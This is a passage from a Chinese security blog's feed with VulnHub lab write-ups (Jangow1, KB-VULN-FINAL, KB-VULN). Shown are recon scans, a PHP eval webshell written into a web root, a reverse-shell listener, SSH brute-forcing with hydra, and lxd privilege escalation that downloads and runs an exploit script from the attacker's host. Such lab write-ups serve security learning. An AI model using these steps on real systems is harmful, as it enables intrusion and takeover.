44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line"></span><br><span class="line">11 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 11 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.108</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.108</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Jangow1&gt; nmap -sV -A -p 1-65535 192.168.1.108                                                                   </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-17 18:47 EST</span><br><span class="line">Nmap scan report for jangow01.lan (192.168.1.108)</span><br><span class="line">Host is up (0.0023s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18</span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| -     2021-06-10 18:05  site/</span><br><span class="line">|_</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Index of /</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.11 - 4.1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: 127.0.0.1; OS: Unix</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   2.29 ms jangow01.lan (192.168.1.108)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 170.38 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.108/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; gobuster dir -u http://192.168.1.108/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.108/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              txt,php,zip,html</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/11/17 18:48:38 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/site                 (Status: 301) [Size: 313] [--&gt; http://192.168.1.108/site/]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                 </span><br><span class="line">                                                                                </span><br><span class="line">===============================================================</span><br><span class="line">2021/11/17 18:52:31 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.1.108/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; gobuster dir -u http://192.168.1.108/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.108/site/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php,zip</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/11/17 18:49:01 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 10190]</span><br><span class="line">/assets               (Status: 301) [Size: 320] [--&gt; http://192.168.1.108/site/assets/]</span><br><span class="line">/css                  (Status: 301) [Size: 317] [--&gt; http://192.168.1.108/site/css/]   </span><br><span class="line">/wordpress            (Status: 301) [Size: 323] [--&gt; http://192.168.1.108/site/wordpress/]</span><br><span class="line">/js                   (Status: 301) [Size: 316] [--&gt; http://192.168.1.108/site/js/]       </span><br><span class="line">                                                                                          </span><br><span class="line">===============================================================</span><br><span class="line">2021/11/17 18:52:57 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Jangow1.0.1/1.png" alt></p>
<p><img data-src="./Jangow1.0.1/2.png" alt></p>
<p><img data-src="./Jangow1.0.1/3.png" alt></p>
<p>??? 随便试试，直接命令执行???</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul>
<li><p>无法反弹<code>shell</code>,应该是做了防火墙</p>
</li>
<li><p>浏览器shell发现敏感文件</p>
</li>
</ul>
<p><img data-src="./Jangow1.0.1/4.png" alt></p>
<p><img data-src="./Jangow1.0.1/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">database = <span class="string">"jangow01"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">username = <span class="string">"jangow01"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">password = <span class="string">"abygurl69"</span>;</span></span><br><span class="line">// Create connection</span><br><span class="line"><span class="meta">$</span><span class="bash">conn = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span></span><br><span class="line">// Check connection</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die("Connection failed: " . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">echo "Connected successfully";</span><br><span class="line"><span class="meta">mysqli_close($</span><span class="bash">conn);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/etc/passwd</span><br><span class="line">jangow01:x:1000:1000:desafio02,,,:/home/jangow01:/bin/bash</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ssh jangow01@192.168.1.108</code>(抱歉，没开22端口)</li>
<li>写入蚁剑<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo '&lt;?php eval($_REQUEST["ant"])?&gt;' &gt;&gt; /var/www/html/site/1.php</span><br></pre></td></tr></table></figure>

<p><img data-src="./Jangow1.0.1/6.png" alt></p>
<ul>
<li>成功拿到虚拟终端</li>
</ul>
<p><img data-src="./Jangow1.0.1/7.png" alt></p>
<ul>
<li>尝试了很久没有拿到反弹shell</li>
</ul>
<p><a href="https://www.freebuf.com/vuls/232544.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/232544.html</a></p>
<ul>
<li><p>忙猜做了出站设置</p>
</li>
<li><p><code>nc -lvvp 443</code></p>
</li>
<li><p>成功拿到<code>shell</code></p>
</li>
</ul>
<p><img data-src="./Jangow1.0.1/8.png" alt></p>
<ul>
<li>切换用户</li>
</ul>
<p><img data-src="./Jangow1.0.1/9.png" alt></p>
<h3 id="提权-amp-amp-flag"><a href="#提权-amp-amp-flag" class="headerlink" title="提权&amp;&amp;flag"></a>提权&amp;&amp;flag</h3><ul>
<li>信息收集一波<a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener">https://github.com/mzet-/linux-exploit-suggester</a></li>
<li>最终结果如下</li>
</ul>
<p><img data-src="./Jangow1.0.1/10.png" alt></p>
<ul>
<li>脏牛失败GG(虚拟机打崩了，重启，这要是正式环境，直接GG)</li>
</ul>
<p><img data-src="./Jangow1.0.1/11.png" alt></p>
<ul>
<li>CVE-2017-16995</li>
</ul>
<p><img data-src="./Jangow1.0.1/12.png" alt></p>
<p><img data-src="./Jangow1.0.1/13.png" alt></p>
<p>备注：上传文件有点恶心，我这边是一句话木马+中国蚁剑</p>
<p><img data-src="./Jangow1.0.1/14.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Jangow</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Jangow</tag>
      </tags>
  </entry>
  <entry>
    <title>KB-VULN-FINAL</title>
    <url>/2021/06/11/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/KB-VULN-FINAL/</url>
    <content><![CDATA[<h1 id="KB-VULN-FINAL"><a href="#KB-VULN-FINAL" class="headerlink" title="KB-VULN-FINAL"></a>KB-VULN-FINAL</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>KB-VULN-FINAL</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/Desktop# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:3b:17:d5, IPv4: 192.168.43.92</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    42:bc:b8:53:66:d8       (Unknown: locally administered)</span><br><span class="line">192.168.43.63   08:00:27:12:30:ce       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.948 seconds (131.42 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.63</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.63</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/Desktop# nmap -sV -A -p 1-65535 192.168.43.63</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-11 10:26 EDT</span><br><span class="line">Nmap scan report for 192.168.43.63</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 cd:15:fb:cc:47:de:a3:16:e9:b8:6b:61:7a:25:5a:b7 (RSA)</span><br><span class="line">|   256 82:a5:1b:08:06:12:c0:36:38:e7:53:18:47:ea:3f:f8 (ECDSA)</span><br><span class="line">|_  256 f4:d9:65:bd:7d:68:03:31:c3:64:06:48:1d:fb:e7:47 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-git: </span><br><span class="line">|   192.168.43.63:80/.git/</span><br><span class="line">|     Git repository found!</span><br><span class="line">|     .gitignore matched patterns 'bug'</span><br><span class="line">|     Repository description: Unnamed repository; edit this file 'description' to name the...                                                                                  </span><br><span class="line">|     Last commit message: &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN...                                                                                                                        </span><br><span class="line">|     Remotes:                                                                                                                                                                                                    </span><br><span class="line">|       https://github.com/textpattern/textpattern.git                                                                                                                                                            </span><br><span class="line">|_    Project type: node.js application (guessed from .gitignore)                                                                                                                                                 </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                                                      </span><br><span class="line">|_http-title: Hacked!                                                                                                                                                                                             </span><br><span class="line">MAC Address: 08:00:27:12:30:CE (Oracle VirtualBox virtual NIC)                                                                                                                                                    </span><br><span class="line">Device type: general purpose                                                                                                                                                                                      </span><br><span class="line">Running: Linux 4.X|5.X                                                                                                                                                                                            </span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5                                                                                                                                                   </span><br><span class="line">OS details: Linux 4.15 - 5.6                                                                                                                                                                                      </span><br><span class="line">Network Distance: 1 hop                                                                                                                                                                                           </span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                        </span><br><span class="line">TRACEROUTE                                                                                                                                                                                                        </span><br><span class="line">HOP RTT     ADDRESS                                                                                                                                                                                               </span><br><span class="line">1   0.38 ms 192.168.43.63                                                                                                                                                                                      </span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                             Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li><p>目录扫描</p>
<p>这里发现不能进行，所有的页面都是被黑的状态</p>
</li>
<li><p>首页</p>
</li>
</ul>
<p><img data-src="./KB-VULN-FINAL/1.png" alt></p>
<h3 id="git目录"><a href="#git目录" class="headerlink" title=".git目录"></a>.git目录</h3><p>发现代码泄露的代码为<code>textpattern-4.8.4</code>,无进展</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img data-src="./KB-VULN-FINAL/2.png" alt></p>
<p><a href="https://github.com/machineboy141/KB-DUMP" target="_blank" rel="noopener">https://github.com/machineboy141/KB-DUMP</a></p>
<p><img data-src="./KB-VULN-FINAL/3.png" alt></p>
<ul>
<li>解压图片中隐藏的信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steghide extract -sf xxx.jpg</span><br></pre></td></tr></table></figure>

<p><img data-src="./KB-VULN-FINAL/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steganopayload1125546.txt </span><br><span class="line">6K3:C4:&gt;6a_a_</span><br><span class="line"></span><br><span class="line">steganopayload1125574.txt </span><br><span class="line">http://kb.final/textpattern/</span><br><span class="line"></span><br><span class="line">steganopayload202720.txt </span><br><span class="line"><span class="meta">25&gt;</span><span class="bash">:?</span></span><br></pre></td></tr></table></figure>

<ul>
<li>解密</li>
</ul>
<p><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a></p>
<p><img data-src="./KB-VULN-FINAL/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获得账号密码</span></span><br><span class="line">admin / ezbircime2020</span><br></pre></td></tr></table></figure>

<ul>
<li>登录<a href="http://kb.final/textpattern/失败" target="_blank" rel="noopener">http://kb.final/textpattern/失败</a></li>
</ul>
<p><img data-src="./KB-VULN-FINAL/6.png" alt></p>
<ul>
<li>当年年份为2021，登录账号密码为<code>admin / ezbircime2021</code>, 登录成功</li>
</ul>
<p><img data-src="./KB-VULN-FINAL/7.png" alt></p>
<p>进入后台</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p><img data-src="./KB-VULN-FINAL/8.png" alt></p>
<p><img data-src="./KB-VULN-FINAL/9.png" alt></p>
<p><img data-src="./KB-VULN-FINAL/10.png" alt></p>
<ul>
<li>反弹shell</li>
</ul>
<p><img data-src="./KB-VULN-FINAL/11.png" alt></p>
<ul>
<li>切换到普通用户</li>
</ul>
<p><img data-src="./KB-VULN-FINAL/12.png" alt></p>
<p>账号密码为 <code>machineboy / ghostroot510</code></p>
<p><img data-src="./KB-VULN-FINAL/13.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
<li><code>lxd</code>提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将构建好的tar文件发送至目标机</span></span><br><span class="line"></span><br><span class="line">wget http://192.168.43.92/46978.sh</span><br><span class="line">wget http://192.168.43.92/alpine-v3.13-x86_64-20210611_1151.tar.gz</span><br><span class="line"></span><br><span class="line">chmod +x 46978.sh</span><br><span class="line">./46978.sh -f alpine-v3.13-x86_64-20210611_1151.tar.gz</span><br></pre></td></tr></table></figure>

<p><img data-src="./KB-VULN-FINAL/14.png" alt></p>
<p><img data-src="./KB-VULN-FINAL/15.png" alt></p>
<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><ul>
<li>貌似最后的提权操作为非预期解</li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
        <category>KB-VULN</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>KB-VULN</title>
    <url>/2021/05/06/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/KB-VULN/</url>
    <content><![CDATA[<h1 id="KB-VULN"><a href="#KB-VULN" class="headerlink" title="KB-VULN"></a>KB-VULN</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>KB-VULN</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/vulnhub/KB-VULN# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.4.76</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.4.1     20:76:93:42:85:21       Lenovo (Beijing) Limited.</span><br><span class="line">192.168.4.129   b0:f8:93:24:54:f1       Shanghai MXCHIP Information Technology Co., Ltd.</span><br><span class="line">192.168.4.185   08:00:27:09:6b:fc       PCS Systemtechnik GmbH</span><br><span class="line">192.168.4.219   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.981 seconds (129.23 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.4.185</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.4.185</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/vulnhub/KB-VULN# nmap -sC -sV -p- 192.168.4.185</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-06 05:09 EDT</span><br><span class="line">Nmap scan report for kb-server.lan (192.168.4.185)</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.4.76</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 4</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 95:84:46:ae:47:21:d1:73:7d:2f:0a:66:87:98:af:d3 (RSA)</span><br><span class="line">|   256 af:79:86:77:00:59:3e:ee:cf:6e:bb:bc:cb:ad:96:cc (ECDSA)</span><br><span class="line">|_  256 9d:4d:2a:a1:65:d4:f2:bd:5b:25:22:ec:bc:6f:66:97 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: OneSchool &amp;mdash; Website by Colorlib</span><br><span class="line">MAC Address: 08:00:27:09:6B:FC (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.19 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./KB-VULN/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.185/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# gobuster dir -u http://192.168.4.185/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.4.185/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/06 05:10:10 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/images (Status: 301)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/js (Status: 301)</span><br><span class="line">/fonts (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/06 05:12:20 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>



<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./KB-VULN/2.png" alt></p>
<ul>
<li>右键源代码</li>
</ul>
<p><img data-src="./KB-VULN/3.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;!-- Username : sysadmin --&gt;</span><br></pre></td></tr></table></figure>

<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><p><img data-src="./KB-VULN/4.png" alt></p>
<ul>
<li>并未发现什么</li>
</ul>
<h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt 192.168.4.185 -t 4 ssh</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/vulnhub/KB-VULN# hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt 192.168.4.185 -t 4 ssh</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-06 05:30:27</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.4.185:22/</span><br><span class="line">[22][ssh] host: 192.168.4.185   login: sysadmin   password: password1</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-06 05:31:18</span><br></pre></td></tr></table></figure>

<p>获得账号密码<code>sysadmin / password1</code></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" target="_blank" rel="noopener">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></p>
<ul>
<li>采用第一种方法</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Install requirements</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Clone repo</span></span><br><span class="line">sudo go get -d -v github.com/lxc/distrobuilder</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Make distrobuilder</span></span><br><span class="line">cd $HOME/go/src/github.com/lxc/distrobuilder</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Prepare the creation of alpine</span></span><br><span class="line">mkdir -p $HOME/ContainerImages/alpine/</span><br><span class="line">cd $HOME/ContainerImages/alpine/</span><br><span class="line">wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create the container</span></span><br><span class="line">sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8</span><br><span class="line"><span class="meta">#</span><span class="bash"> If that fails, run it adding -o image.release=3.8 at the end.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Then, upload to the vulnerable server the files lxd.tar.xz and rootfs.squashfs</span></span><br><span class="line"></span><br><span class="line">wget http://192.168.4.163/lxd.tar.xz</span><br><span class="line">wget http://192.168.4.163/rootfs.squashfs</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Add the image</span></span><br><span class="line">lxc image import lxd.tar.xz rootfs.squashfs --alias alpine</span><br><span class="line">lxc image list #You can see your new imported image</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create a container and add root path</span></span><br><span class="line">lxd init # 第一次需要</span><br><span class="line">lxc init alpine privesc -c security.privileged=true</span><br><span class="line">lxc list #List containers</span><br><span class="line">lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Execute the container</span></span><br><span class="line">lxc start privesc</span><br><span class="line">lxc exec privesc /bin/sh</span><br><span class="line">[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted</span><br></pre></td></tr></table></figure>

<p><img data-src="./KB-VULN/5.png" alt></p>
<p><img data-src="./KB-VULN/6.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>KB-VULN</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>KB-VULN</tag>
      </tags>
  </entry>
  <entry>
    <title>KB-VULN2</title>
    <url>/2021/05/07/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/KB-VULN2/</url>
